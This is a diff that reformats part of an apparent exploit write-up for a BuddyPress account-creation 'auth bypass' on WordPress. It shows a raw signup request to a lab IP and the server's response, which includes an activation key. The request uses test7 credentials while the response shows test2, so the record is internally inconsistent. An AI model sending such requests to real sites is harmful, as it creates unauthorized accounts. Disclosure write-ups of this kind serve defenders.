@@ -49,8 +49,8 @@ Creating a user account with auth bypass
 We will craft a request to create an account.
 
 Let's craft the request.
-
-<<POST /wp-json/buddypress/v1/signup HTTP/1.1
+'''
+POST /wp-json/buddypress/v1/signup HTTP/1.1
 HOST: 192.168.0.16:7006
 Content-Type: application/json; charset=UTF-8
 Content-Length: 107
@@ -60,10 +60,12 @@ Content-Length: 107
 "user_email": "test7@test.com",
 "user_name": "test7",
 "password": "test7"
-}>>
+}
+'''
 
  
 Response
+'''
 Response
 HTTP/1.1 200 OK
 Date: Wed, 11 Jan 2023 20:45:36 GMT
@@ -81,13 +83,15 @@ Content-Type: application/json; charset=UTF-8
 
 
 [{"id":7,"user_login":"test2","registered":"2023-01-11T20:45:36","user_name":"test2","activation_key":"tg2WcJEbkzRnOBwwRjzPDYN05qpJPL1L","user_email":"test2@test.com","date_sent":"2023-01-11T20:45:36","count_sent":1,"meta":{"field_1":"test2","profile_field_ids":1}}]
+'''
 
 Excellent we  have created an account with the creds
-user_login": "test2", 
+'''
+"user_login": "test2", 
 "user_email": "test2@test.com", 
 "user_name": "test2", 
 "password": "test2"
-
+'''
 
 
 
